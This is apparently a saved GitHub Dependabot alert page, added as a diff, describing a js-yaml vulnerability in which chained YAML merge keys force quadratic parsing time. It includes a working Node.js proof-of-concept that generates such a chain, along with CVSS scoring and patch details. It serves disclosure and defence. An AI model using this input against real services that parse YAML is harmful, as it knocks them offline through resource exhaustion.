@@ -1,0 +1,135 @@
+Skip to content
+CreoDAMO
+BasisGuard
+Repository navigation
+Code
+Issues
+Pull requests
+Agents
+Actions
+Projects
+Security and quality
+5
+ (5)
+Insights
+Settings
+← Dependabot alerts
+js-yaml: YAML merge-key chains can force quadratic CPU consumption #3
+Open
+On js-yaml (npm) pnpm-lock.yaml • 26 minutes ago
+Dependabot cannot update js-yaml to a non-vulnerable version
+The latest possible version of js-yaml that can be installed is 4.2.0.
+
+The earliest fixed version is 4.3.0.
+
+Package
+Affected versions
+Patched version
+js-yaml
+(npm)
+>= 4.0.0, < 4.3.0
+4.3.0
+Impact
+js-yaml can spend quadratic CPU time parsing a document whose size grows only linearly. The issue is triggered by a chain of mappings where each mapping merges the previous one:
+
+a0: &a0 { k0: 0 }
+a1: &a1 { <<: *a0, k1: 1 }
+a2: &a2 { <<: *a1, k2: 2 }
+a3: &a3 { <<: *a2, k3: 3 }
+...
+b: *aN
+For each new mapping, the loader has to enumerate the keys inherited from the previous mapping. With N chained mappings, this results in roughly 1 + 2 + ... + N merged-key visits, i.e., O(N^2) work for O(N) input size.
+
+PoC
+From N = 4000 delay become > 1s (doc size < 100K)
+
+import { performance } from 'node:perf_hooks'
+import { Buffer } from 'node:buffer'
+import { load, YAML11_SCHEMA } from 'js-yaml'
+
+const n = Number(process.argv[2] || 4000)
+
+function makeMergeChain (count) {
+  const lines = ['a0: &a0 { k0: 0 }']
+
+  for (let i = 1; i < count; i++) {
+    lines.push(`a${i}: &a${i} { <<: *a${i - 1}, k${i}: ${i} }`)
+  }
+
+  lines.push(`b: *a${count - 1}`)
+  return `${lines.join('\n')}\n`
+}
+
+const source = makeMergeChain(n)
+
+console.log(source.split('\n').slice(0, 8).join('\n'))
+console.log('...')
+console.log(source.split('\n').slice(-4).join('\n'))
+console.log()
+console.log(`N: ${n}`)
+console.log(`YAML size: ${Buffer.byteLength(source)} bytes`)
+
+const started = performance.now()
+const result = load(source, { schema: YAML11_SCHEMA })
+const elapsed = performance.now() - started
+
+console.log(`parse time: ${elapsed.toFixed(1)} ms`)
+console.log(`top-level keys: ${Object.keys(result).length}`)
+console.log(`b keys: ${Object.keys(result.b).length}`)
+Patches
+Fix released. The most robust protection is to limit the total number of merged keys per parse call. This should close all past and future edge cases with merge. The default 10K-key limit should be okay in most cases.
+
+@dependabot dependabot Bot opened this 26 minutes ago
+Alert metadata
+Severity
+High
+/ 10
+CVSS v3 base metrics
+Attack vector
+Network
+Attack complexity
+Low
+Privileges required
+None
+User interaction
+None
+Scope
+Unchanged
+Confidentiality
+None
+Integrity
+None
+Availability
+High
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+Assignees
+Enable GitHub Advanced Security to assign Dependabot alerts in this repository. Learn more about alert assignees
+
+EPSS score
+ (30th percentile)
+Tags
+Runtime dependency Patch available
+Weaknesses
+WeaknessCWE-400
+WeaknessCWE-407
+CVE ID
+CVE-2026-59869
+GHSA ID
+GHSA-52cp-r559-cp3m
+See advisory in GitHub Advisory Database
+See all of your affected repositories
+See something to contribute?
+Suggest improvements for this advisory on the GitHub Advisory Database.
+Footer
+© 2026 GitHub, Inc.
+Footer navigation
+Terms
+Privacy
+Security
+Status
+Community
+Docs
+Contact
+Manage cookies
+Do not share my personal information
+ 
